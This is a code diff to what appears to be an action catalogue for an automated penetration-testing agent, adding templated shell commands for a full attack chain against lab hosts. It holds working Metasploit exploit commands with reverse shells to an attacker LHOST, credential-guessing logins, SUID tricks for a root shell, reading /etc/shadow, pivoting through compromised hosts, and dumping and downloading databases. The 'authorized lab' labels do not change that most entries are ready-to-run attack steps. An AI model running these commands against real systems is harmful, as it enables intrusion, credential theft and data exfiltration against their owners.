@@ -636,7 +636,7 @@ ACTIONS = {
         "category": "enumeration",
         "phase": "ftp_enum",
         "tool": "nc",
-        "command_template": "nc -nv -w 5 {target_ip} {target_port}",
+        "command_template": "printf 'QUIT\\r\\n' | nc -nv -w 5 {target_ip} {target_port}",
         "placeholders": ["target_ip", "target_port"],
         "parser_family": "generic_banner",
         "expected_events": ["SERVICE_BANNER_DETECTED"],
@@ -672,7 +672,8 @@ ACTIONS = {
         "category": "enumeration",
         "phase": "ftp_enum",
         "tool": "nmap",
-        "command_template": "nmap -p {target_port} --script ftp-* {target_ip}",
+        "command_template": "nmap -p {target_port} --script ftp-anon,ftp-syst --script-timeout 10s --host-timeout 30s {target_ip}",
+        # "command_template": "nmap -p {target_port} --script ftp-* {target_ip}",
         "placeholders": ["target_ip", "target_port"],
         "parser_family": "nmap_ftp",
         "expected_events": ["FTP_INFO_DETECTED", "SCRIPT_RESULT"],
@@ -780,6 +781,61 @@ ACTIONS = {
         },
         "risk_level": "low",
         "description": "Attempt DNS zone transfer in authorized lab.",
+    },
+
+    # -------------------------
+    # NFS / RPC
+    # -------------------------
+
+    360: {
+        "name": "ENUM_NFS_EXPORTS",
+        "category": "enumeration",
+        "phase": "nfs_enum",
+        "tool": "showmount",
+        "command_template": "showmount -e {target_ip}",
+        "placeholders": ["target_ip"],
+        "parser_family": "showmount",
+        "expected_events": ["NFS_EXPORT_FOUND"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_service": ["nfs", "nfs_acl", "mountd", "rpcbind"],
+        },
+        "risk_level": "safe",
+        "description": "Enumerate NFS exported directories.",
+    },
+
+    361: {
+        "name": "ENUM_RPC_SERVICES",
+        "category": "enumeration",
+        "phase": "rpc_enum",
+        "tool": "rpcinfo",
+        "command_template": "rpcinfo -p {target_ip}",
+        "placeholders": ["target_ip"],
+        "parser_family": "rpcinfo",
+        "expected_events": ["RPC_SERVICE_FOUND"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_service": ["rpcbind", "sunrpc"],
+        },
+        "risk_level": "safe",
+        "description": "Enumerate RPC services exposed by the target.",
+    },
+
+    362: {
+        "name": "ENUM_NFS_NMAP_SCRIPTS",
+        "category": "enumeration",
+        "phase": "nfs_enum",
+        "tool": "nmap",
+        "command_template": "nmap -p 111,2049 --script nfs-showmount,nfs-ls,nfs-statfs {target_ip}",
+        "placeholders": ["target_ip"],
+        "parser_family": "nmap_nfs",
+        "expected_events": ["NFS_EXPORT_FOUND", "NFS_INFO_DETECTED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_service": ["nfs", "rpcbind", "sunrpc"],
+        },
+        "risk_level": "low",
+        "description": "Enumerate NFS exports and metadata using Nmap NSE scripts.",
     },
 
      # -------------------------
@@ -1065,6 +1121,104 @@ ACTIONS = {
         "description": "Check whether anonymous FTP login is allowed.",
     },
 
+    520: {
+        "name": "CHECK_SSH_KNOWN_CREDS",
+        "category": "credential_attack",
+        "phase": "credential_attack",
+        "tool": "ssh",
+        "command_template": "sshpass -p {password} ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 {username}@{target_ip} 'whoami; id; hostname'",
+        "placeholders": ["target_ip", "username", "password"],
+        "parser_family": "ssh_login",
+        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_SUCCESS", "SESSION_OPENED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_service": ["ssh"],
+            "requires_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Validate known SSH credentials in an authorized lab.",
+    },
+
+    521: {
+        "name": "CHECK_TELNET_KNOWN_CREDS",
+        "category": "credential_attack",
+        "phase": "credential_attack",
+        "tool": "hydra",
+        "command_template": "hydra -l {username} -p {password} telnet://{target_ip}",
+        "placeholders": ["target_ip", "username", "password"],
+        "parser_family": "hydra",
+        "expected_events": ["VALID_CREDENTIAL_FOUND", "LOGIN_SUCCESS"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_service": ["telnet"],
+            "requires_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Validate known Telnet credentials in an authorized lab.",
+    },
+
+    522: {
+        "name": "CHECK_MYSQL_KNOWN_CREDS",
+        "category": "credential_attack",
+        "phase": "credential_attack",
+        "tool": "mysql",
+        "command_template": "mysql -h {target_ip} -P {target_port} -u {username} -p{password} -e 'SELECT VERSION();'",
+        "placeholders": ["target_ip", "target_port", "username", "password"],
+        "parser_family": "mysql_client",
+        "expected_events": ["VALID_CREDENTIAL_FOUND", "DB_LOGIN_SUCCESS"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_target_port": True,
+            "requires_service": ["mysql"],
+            "requires_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "medium",
+        "description": "Validate known MySQL credentials.",
+    },
+
+    523: {
+        "name": "CHECK_POSTGRES_KNOWN_CREDS",
+        "category": "credential_attack",
+        "phase": "credential_attack",
+        "tool": "psql",
+        "command_template": "PGPASSWORD={password} psql -h {target_ip} -p {target_port} -U {username} -c 'SELECT version();'",
+        "placeholders": ["target_ip", "target_port", "username", "password"],
+        "parser_family": "postgres_client",
+        "expected_events": ["VALID_CREDENTIAL_FOUND", "DB_LOGIN_SUCCESS"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_target_port": True,
+            "requires_service": ["postgresql"],
+            "requires_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "medium",
+        "description": "Validate known PostgreSQL credentials.",
+    },
+
+    524: {
+        "name": "CHECK_TOMCAT_MANAGER_CREDS",
+        "category": "credential_attack",
+        "phase": "credential_attack",
+        "tool": "curl",
+        "command_template": "curl -s -u {username}:{password} --max-time 10 http://{target_ip}:{target_port}/manager/html",
+        "placeholders": ["target_ip", "target_port", "username", "password"],
+        "parser_family": "tomcat_manager",
+        "expected_events": ["VALID_CREDENTIAL_FOUND", "TOMCAT_MANAGER_ACCESS_GRANTED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_target_port": True,
+            "requires_service": ["http", "tomcat"],
+            "requires_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "medium",
+        "description": "Validate Tomcat Manager credentials.",
+    },
+
     # ============================================================
     # 600-699 EXPLOITATION CONTROLADA EN LABORATORIO
     # ============================================================
@@ -1141,6 +1295,123 @@ ACTIONS = {
         },
         "risk_level": "high",
         "description": "Attempt Tomcat manager upload exploit with known valid credentials in lab.",
+    },
+
+    604: {
+        "name": "MSF_EXPLOIT_POSTGRES_PAYLOAD",
+        "category": "exploit",
+        "phase": "exploit",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use exploit/linux/postgres/postgres_payload; set RHOSTS {target_ip}; set RPORT {target_port}; set USERNAME {username}; set PASSWORD {password}; set payload linux/x86/meterpreter/reverse_tcp; set LHOST {lhost}; run; exit\"",
+        "placeholders": ["target_ip", "target_port", "username", "password", "lhost"],
+        "parser_family": "msfconsole",
+        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_target_port": True,
+            "requires_service": ["postgresql"],
+            "requires_valid_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Attempt PostgreSQL payload execution with known valid credentials in a controlled lab.",
+    },
+
+    605: {
+        "name": "MSF_EXPLOIT_UNREAL_IRCD_BACKDOOR",
+        "category": "exploit",
+        "phase": "exploit",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOSTS {target_ip}; set RPORT {target_port}; set payload cmd/unix/reverse_perl; set LHOST {lhost}; run; exit\"",
+        "placeholders": ["target_ip", "target_port", "lhost"],
+        "parser_family": "msfconsole",
+        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_target_port": True,
+            "requires_service": ["irc"],
+            "requires_candidate_vuln": "unreal_ircd_3281_backdoor",
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Attempt UnrealIRCd backdoor exploit in a controlled lab.",
+    },
+
+    606: {
+        "name": "CONNECT_INGRESLOCK_BIND_SHELL",
+        "category": "exploit",
+        "phase": "exploit",
+        "tool": "nc",
+        "command_template": "nc -nv -w 5 {target_ip} {target_port}",
+        "placeholders": ["target_ip", "target_port"],
+        "parser_family": "bind_shell",
+        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_target_port": True,
+            "requires_service": ["ingreslock", "bind_shell"],
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Connect to exposed bind shell service in a controlled lab.",
+    },
+
+    607: {
+        "name": "MSF_EXPLOIT_RLOGIN_RSH_TRUST",
+        "category": "exploit",
+        "phase": "exploit",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use exploit/unix/remote/rlogin_login; set RHOSTS {target_ip}; set USERNAME {username}; set PASSWORD {password}; run; exit\"",
+        "placeholders": ["target_ip", "username", "password"],
+        "parser_family": "msfconsole",
+        "expected_events": ["EXPLOIT_ATTEMPTED", "LOGIN_SUCCESS", "SESSION_OPENED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_service": ["rlogin", "shell", "login"],
+            "requires_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Attempt rlogin/rsh style remote login in a controlled lab.",
+    },
+
+    608: {
+        "name": "MSF_EXPLOIT_JAVA_RMI_SERVER",
+        "category": "exploit",
+        "phase": "exploit",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use exploit/multi/misc/java_rmi_server; set RHOSTS {target_ip}; set RPORT {target_port}; set payload java/meterpreter/reverse_tcp; set LHOST {lhost}; run; exit\"",
+        "placeholders": ["target_ip", "target_port", "lhost"],
+        "parser_family": "msfconsole",
+        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_target_port": True,
+            "requires_service": ["java-rmi", "rmiregistry"],
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Attempt Java RMI server exploitation in a controlled lab.",
+    },
+
+    609: {
+        "name": "MSF_EXPLOIT_DOCKER_DISTCC_EXEC",
+        "category": "exploit",
+        "phase": "exploit",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use exploit/unix/misc/distcc_exec; set RHOSTS {target_ip}; set RPORT {target_port}; set payload cmd/unix/reverse_netcat; set LHOST {lhost}; run; exit\"",
+        "placeholders": ["target_ip", "target_port", "lhost"],
+        "parser_family": "msfconsole",
+        "expected_events": ["EXPLOIT_ATTEMPTED", "SESSION_OPENED"],
+        "preconditions": {
+            "requires_target_ip": True,
+            "requires_target_port": True,
+            "requires_service": ["distccd", "distcc"],
+            "requires_candidate_vuln": "distcc_exec",
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Attempt distcc exploitation with explicit reverse payload parameters.",
     },
 
      # ============================================================
@@ -1226,7 +1497,558 @@ ACTIONS = {
         "risk_level": "low",
         "description": "Inspect network interfaces in an established session.",
     },
+
+    705: {
+        "name": "POST_ENUM_IP_ROUTE",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "ip",
+        "command_template": "ip route",
+        "placeholders": [],
+        "parser_family": "linux_ip_route",
+        "expected_events": ["SESSION_ROUTE_TABLE_DETECTED"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Inspect routing table in an established session.",
+    },
+
+    706: {
+        "name": "POST_ENUM_SS_LISTENERS",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "ss",
+        "command_template": "ss -tulnp",
+        "placeholders": [],
+        "parser_family": "linux_ss",
+        "expected_events": ["SESSION_LISTENER_DETECTED"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Inspect listening services from the compromised host.",
+    },
+
+    707: {
+        "name": "POST_ENUM_NETSTAT_LISTENERS",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "netstat",
+        "command_template": "netstat -tulnp",
+        "placeholders": [],
+        "parser_family": "linux_netstat",
+        "expected_events": ["SESSION_LISTENER_DETECTED"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Inspect listening services using netstat from the compromised host.",
+    },
+
+    708: {
+        "name": "POST_ENUM_USERS_PASSWD",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "cat",
+        "command_template": "cat /etc/passwd",
+        "placeholders": [],
+        "parser_family": "linux_passwd",
+        "expected_events": ["LOCAL_USER_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Enumerate local users from /etc/passwd.",
+    },
+
+    709: {
+        "name": "POST_ENUM_HOME_USERS",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "grep",
+        "command_template": "cat /etc/passwd | grep home",
+        "placeholders": [],
+        "parser_family": "linux_passwd",
+        "expected_events": ["LOCAL_INTERACTIVE_USER_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Identify users with home directories and likely interactive accounts.",
+    },
+
+    710: {
+        "name": "POST_ENUM_PROCESSES",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "ps",
+        "command_template": "ps aux",
+        "placeholders": [],
+        "parser_family": "linux_ps",
+        "expected_events": ["PROCESS_DETECTED"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Enumerate running processes on the compromised host.",
+    },
+
+    711: {
+        "name": "POST_ENUM_ENV",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "env",
+        "command_template": "env",
+        "placeholders": [],
+        "parser_family": "linux_env",
+        "expected_events": ["ENV_VAR_DETECTED"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Inspect environment variables in the compromised session.",
+    },
+
+    712: {
+        "name": "POST_CHECK_SUDO_PRIVS",
+        "category": "post_exploit",
+        "phase": "privilege_escalation_discovery",
+        "tool": "sudo",
+        "command_template": "sudo -l",
+        "placeholders": [],
+        "parser_family": "sudo_l",
+        "expected_events": ["SUDO_PRIVILEGE_DETECTED", "PRIVESC_VECTOR_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Check sudo privileges for the current compromised user.",
+    },
+
+    713: {
+        "name": "POST_CHECK_SUDOERS_PERMS",
+        "category": "post_exploit",
+        "phase": "privilege_escalation_discovery",
+        "tool": "ls",
+        "command_template": "ls -l /etc/sudoers",
+        "placeholders": [],
+        "parser_family": "linux_ls",
+        "expected_events": ["FILE_PERMISSION_DETECTED"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Check file permissions on /etc/sudoers.",
+    },
+
+    714: {
+        "name": "POST_FIND_SUID_BINARIES",
+        "category": "post_exploit",
+        "phase": "privilege_escalation_discovery",
+        "tool": "find",
+        "command_template": "find / -perm -4000 -type f 2>/dev/null",
+        "placeholders": [],
+        "parser_family": "linux_find_suid",
+        "expected_events": ["SUID_BINARY_FOUND", "PRIVESC_VECTOR_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Find binaries with SUID bit set.",
+    },
+
+    715: {
+        "name": "POST_PRIVESC_NMAP_INTERACTIVE",
+        "category": "post_exploit",
+        "phase": "privilege_escalation",
+        "tool": "nmap",
+        "command_template": "nmap --interactive",
+        "placeholders": [],
+        "parser_family": "interactive_shell",
+        "expected_events": ["PRIVESC_ATTEMPTED", "ROOT_SHELL_OPENED"],
+        "preconditions": {
+            "requires_session": True,
+            "requires_suid_binary": "nmap",
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Use legacy SUID nmap interactive mode to attempt root shell in lab.",
+    },
+
+    716: {
+        "name": "POST_PRIVESC_FIND_SUID_SHELL",
+        "category": "post_exploit",
+        "phase": "privilege_escalation",
+        "tool": "find",
+        "command_template": "find . -exec /bin/sh -p \\; -quit",
+        "placeholders": [],
+        "parser_family": "interactive_shell",
+        "expected_events": ["PRIVESC_ATTEMPTED", "ROOT_SHELL_OPENED"],
+        "preconditions": {
+            "requires_session": True,
+            "requires_suid_binary": "find",
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Use SUID find GTFOBins technique to attempt privileged shell in lab.",
+    },
+
+    717: {
+        "name": "POST_READ_SHADOW",
+        "category": "post_exploit",
+        "phase": "credential_access",
+        "tool": "cat",
+        "command_template": "cat /etc/shadow",
+        "placeholders": [],
+        "parser_family": "linux_shadow",
+        "expected_events": ["PASSWORD_HASH_FOUND", "SENSITIVE_FILE_READ"],
+        "preconditions": {
+            "requires_session": True,
+            "requires_privilege": "root",
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Read /etc/shadow after root access to collect password hash evidence in lab.",
+    },
+
+    718: {
+        "name": "POST_LIST_SSH_HOST_KEYS",
+        "category": "post_exploit",
+        "phase": "credential_access",
+        "tool": "ls",
+        "command_template": "ls -la /etc/ssh",
+        "placeholders": [],
+        "parser_family": "linux_ls",
+        "expected_events": ["SSH_KEY_FILE_FOUND", "SENSITIVE_FILE_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "medium",
+        "description": "List SSH host key files as sensitive evidence.",
+    },
+
+    719: {
+        "name": "POST_READ_CRONTAB",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "cat",
+        "command_template": "cat /etc/crontab",
+        "placeholders": [],
+        "parser_family": "linux_crontab",
+        "expected_events": ["CRON_ENTRY_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Read system crontab for persistence and scheduled task evidence.",
+    },
+
+
+    730: {
+        "name": "MSF_POST_ENUM_SYSTEM",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use post/linux/gather/enum_system; set SESSION {session_id}; run; exit\"",
+        "placeholders": ["session_id"],
+        "parser_family": "msfconsole_post",
+        "expected_events": ["SESSION_SYSTEM_DETECTED", "LOCAL_USER_FOUND", "SYSTEM_INFO_DETECTED"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Run Metasploit Linux system enumeration module.",
+    },
+
+    731: {
+        "name": "MSF_POST_ENUM_CONFIGS",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use post/linux/gather/enum_configs; set SESSION {session_id}; run; exit\"",
+        "placeholders": ["session_id"],
+        "parser_family": "msfconsole_post",
+        "expected_events": ["CONFIG_FILE_FOUND", "SENSITIVE_FILE_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "medium",
+        "description": "Run Metasploit Linux configuration enumeration module.",
+    },
+
+    732: {
+        "name": "MSF_POST_ENUM_NETWORK",
+        "category": "post_exploit",
+        "phase": "post_exploit",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use post/linux/gather/enum_network; set SESSION {session_id}; run; exit\"",
+        "placeholders": ["session_id"],
+        "parser_family": "msfconsole_post",
+        "expected_events": ["SESSION_NET_INFO_DETECTED", "INTERNAL_NETWORK_DISCOVERED"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "low",
+        "description": "Run Metasploit Linux network enumeration module.",
+    },
+
+    733: {
+        "name": "MSF_LOCAL_EXPLOIT_SUGGESTER",
+        "category": "post_exploit",
+        "phase": "privilege_escalation_discovery",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use post/multi/recon/local_exploit_suggester; set SESSION {session_id}; run; exit\"",
+        "placeholders": ["session_id"],
+        "parser_family": "msfconsole_local_exploit_suggester",
+        "expected_events": ["PRIVESC_VECTOR_FOUND", "CANDIDATE_VULN_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "medium",
+        "description": "Run Metasploit local exploit suggester against an established session.",
+    },
+
+    760: {
+        "name": "MSF_AUTOROUTE_ADD_INTERNAL_NET",
+        "category": "post_exploit",
+        "phase": "pivoting",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use post/multi/manage/autoroute; set SESSION {session_id}; set SUBNET {target_subnet}; set NETMASK {target_netmask}; run; route print; exit\"",
+        "placeholders": ["session_id", "target_subnet", "target_netmask"],
+        "parser_family": "msfconsole_autoroute",
+        "expected_events": ["ROUTE_ADDED", "INTERNAL_NETWORK_REACHABLE"],
+        "preconditions": {
+            "requires_session": True,
+            "requires_internal_network": True,
+        },
+        "risk_level": "medium",
+        "description": "Add a route through the compromised host to reach an internal subnet.",
+    },
+
+    761: {
+        "name": "MSF_START_SOCKS_PROXY",
+        "category": "post_exploit",
+        "phase": "pivoting",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"use auxiliary/server/socks_proxy; set VERSION 4a; set SRVHOST 127.0.0.1; set SRVPORT {socks_port}; run -j; jobs; exit\"",
+        "placeholders": ["socks_port"],
+        "parser_family": "msfconsole_socks",
+        "expected_events": ["SOCKS_PROXY_STARTED"],
+        "preconditions": {
+            "requires_route_to_internal_network": True,
+        },
+        "risk_level": "medium",
+        "description": "Start a SOCKS proxy in Metasploit for pivoting through the compromised host.",
+    },
+
+    762: {
+        "name": "PIVOT_SCAN_INTERNAL_NET_PROXYCHAINS",
+        "category": "post_exploit",
+        "phase": "pivoting",
+        "tool": "proxychains",
+        "command_template": "proxychains nmap -sT -Pn {target}",
+        "placeholders": ["target"],
+        "parser_family": "nmap_portscan",
+        "expected_events": ["HOST_DISCOVERED", "PORT_OPEN", "INTERNAL_SERVICE_DETECTED"],
+        "preconditions": {
+            "requires_socks_proxy": True,
+            "requires_target": True,
+        },
+        "risk_level": "medium",
+        "description": "Scan an internal network through SOCKS proxy using proxychains and TCP connect scan.",
+    },
+
+    763: {
+        "name": "MSF_PORTFWD_ADD",
+        "category": "post_exploit",
+        "phase": "pivoting",
+        "tool": "msfconsole",
+        "command_template": "msfconsole -q -x \"sessions -i {session_id} -c 'portfwd add -l {local_port} -p {remote_port} -r {remote_host}'; sessions -i {session_id} -c 'portfwd list'; exit\"",
+        "placeholders": ["session_id", "local_port", "remote_port", "remote_host"],
+        "parser_family": "msfconsole_portfwd",
+        "expected_events": ["PORT_FORWARD_ADDED"],
+        "preconditions": {
+            "requires_session": True,
+            "requires_internal_host": True,
+            "requires_internal_service": True,
+        },
+        "risk_level": "medium",
+        "description": "Forward a remote internal service port to a local attacker port.",
+    },
+
+    764: {
+        "name": "PIVOT_MYSQL_LOGIN_LOCAL_PORTFWD",
+        "category": "post_exploit",
+        "phase": "pivoting",
+        "tool": "mysql",
+        "command_template": "mysql --ssl=0 -h 127.0.0.1 -P {local_port} -u {username} -p{password} -e 'SHOW DATABASES;'",
+        "placeholders": ["local_port", "username", "password"],
+        "parser_family": "mysql_client",
+        "expected_events": ["DB_LOGIN_SUCCESS", "DATABASE_FOUND"],
+        "preconditions": {
+            "requires_port_forward": True,
+            "requires_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "medium",
+        "description": "Access internal MySQL service through local port forwarding.",
+    },
+
+    765: {
+        "name": "PIVOT_MYSQL_DUMP_ALL_DATABASES",
+        "category": "post_exploit",
+        "phase": "exfiltration",
+        "tool": "mysqldump",
+        "command_template": "mysqldump -h 127.0.0.1 -P {local_port} -u {username} -p{password} --all-databases > {output_file}",
+        "placeholders": ["local_port", "username", "password", "output_file"],
+        "parser_family": "mysqldump",
+        "expected_events": ["DATABASE_DUMP_CREATED", "EVIDENCE_COLLECTED"],
+        "preconditions": {
+            "requires_port_forward": True,
+            "requires_credentials": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Dump internal MySQL databases through pivoted port forwarding as lab evidence.",
+    },
+
+    780: {
+        "name": "POST_SEARCH_WEB_PASSWORDS",
+        "category": "post_exploit",
+        "phase": "credential_access",
+        "tool": "grep",
+        "command_template": "grep -R \"pass\" -ni /var/www 2>/dev/null",
+        "placeholders": [],
+        "parser_family": "grep_credentials",
+        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "SENSITIVE_FILE_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "medium",
+        "description": "Search for password references in web application files.",
+    },
+
+    781: {
+        "name": "POST_SEARCH_WEB_DB_CONFIGS",
+        "category": "post_exploit",
+        "phase": "credential_access",
+        "tool": "grep",
+        "command_template": "grep -R \"db\" -ni /var/www 2>/dev/null",
+        "placeholders": [],
+        "parser_family": "grep_credentials",
+        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "DB_CONFIG_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "medium",
+        "description": "Search for database configuration references in web application files.",
+    },
+
+    782: {
+        "name": "POST_READ_DVWA_CONFIG",
+        "category": "post_exploit",
+        "phase": "credential_access",
+        "tool": "cat",
+        "command_template": "cat /var/www/dvwa/config/config.inc.php",
+        "placeholders": [],
+        "parser_family": "php_config",
+        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "DB_CONFIG_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "medium",
+        "description": "Read DVWA database configuration file.",
+    },
+
+    783: {
+        "name": "POST_READ_PHPMYADMIN_CONFIG",
+        "category": "post_exploit",
+        "phase": "credential_access",
+        "tool": "cat",
+        "command_template": "cat /etc/phpmyadmin/config-db.php",
+        "placeholders": [],
+        "parser_family": "php_config",
+        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "DB_CONFIG_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "medium",
+        "description": "Read phpMyAdmin database configuration file.",
+    },
+
+    784: {
+        "name": "POST_READ_TIKIWIKI_DB_CONFIG",
+        "category": "post_exploit",
+        "phase": "credential_access",
+        "tool": "cat",
+        "command_template": "cat /var/www/tikiwiki/db/local.php",
+        "placeholders": [],
+        "parser_family": "php_config",
+        "expected_events": ["POTENTIAL_CREDENTIAL_FOUND", "DB_CONFIG_FOUND"],
+        "preconditions": {
+            "requires_session": True,
+        },
+        "risk_level": "medium",
+        "description": "Read TikiWiki database configuration file.",
+    },
+
+    790: {
+        "name": "POST_ARCHIVE_MYSQL_DATA_DIR",
+        "category": "post_exploit",
+        "phase": "exfiltration",
+        "tool": "tar",
+        "command_template": "cd /var/lib && tar -cvf /tmp/mysql.tar mysql/ && chmod 644 /tmp/mysql.tar",
+        "placeholders": [],
+        "parser_family": "tar",
+        "expected_events": ["EVIDENCE_ARCHIVE_CREATED"],
+        "preconditions": {
+            "requires_session": True,
+            "requires_privilege": "root",
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Archive MySQL data directory as lab evidence after root access.",
+    },
+
+    791: {
+        "name": "POST_ARCHIVE_POSTGRES_DATA_DIR",
+        "category": "post_exploit",
+        "phase": "exfiltration",
+        "tool": "tar",
+        "command_template": "cd /var/lib/postgresql/8.3 && tar -cvf /tmp/pgsql.tar main/ && chmod 644 /tmp/pgsql.tar",
+        "placeholders": [],
+        "parser_family": "tar",
+        "expected_events": ["EVIDENCE_ARCHIVE_CREATED"],
+        "preconditions": {
+            "requires_session": True,
+            "requires_privilege": "root",
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Archive PostgreSQL data directory as lab evidence after root access.",
+    },
+
+    792: {
+        "name": "MSF_DOWNLOAD_EVIDENCE_FILE",
+        "category": "post_exploit",
+        "phase": "exfiltration",
+        "tool": "meterpreter",
+        "command_template": "download {remote_file}",
+        "placeholders": ["remote_file"],
+        "parser_family": "meterpreter_download",
+        "expected_events": ["FILE_DOWNLOADED", "EVIDENCE_COLLECTED"],
+        "preconditions": {
+            "requires_meterpreter_session": True,
+            "requires_remote_file": True,
+            "requires_authorization": True,
+        },
+        "risk_level": "high",
+        "description": "Download a selected evidence file through Meterpreter.",
+    },
 }
+
+
 
 def get_action(action_id: int) -> dict:
     return ACTIONS.get(action_id, ACTIONS[0])
@@ -1415,11 +2237,13 @@ def extract_action_id_from_cmd(cmd: str) -> int:
         return 360
     if s.startswith("rpcinfo -p "):
         return 361
-
+    
     # ============================================================
     # Databases / RDP / VNC
     # ============================================================
 
+    if s.startswith("nmap ") and ("nfs-showmount" in s or "nfs-ls" in s or "nfs-statfs" in s):
+        return 362
     if s.startswith("nmap ") and "mysql-info" in s:
         return 370
     if s.startswith("nmap ") and "pgsql" in s:
@@ -1454,6 +2278,17 @@ def extract_action_id_from_cmd(cmd: str) -> int:
         return 501
     if s.startswith("hydra ") and "http-post-form" in s:
         return 502
+    
+    if s.startswith("sshpass ") and " ssh " in s:
+        return 520
+    if s.startswith("hydra ") and "telnet://" in s:
+        return 521
+    if s.startswith("mysql ") and "select version()" in s:
+        return 522
+    if s.startswith("pgpassword=") and "psql " in s:
+        return 523
+    if s.startswith("curl ") and "/manager/html" in s and "-u " in s:
+        return 524
 
     # ============================================================
     # Metasploit lab exploitation
@@ -1467,7 +2302,16 @@ def extract_action_id_from_cmd(cmd: str) -> int:
         return 602
     if s.startswith("msfconsole ") and "tomcat_mgr_upload" in s:
         return 603
-
+    if s.startswith("msfconsole ") and "postgres_payload" in s:
+        return 604
+    if s.startswith("msfconsole ") and "unreal_ircd_3281_backdoor" in s:
+        return 605
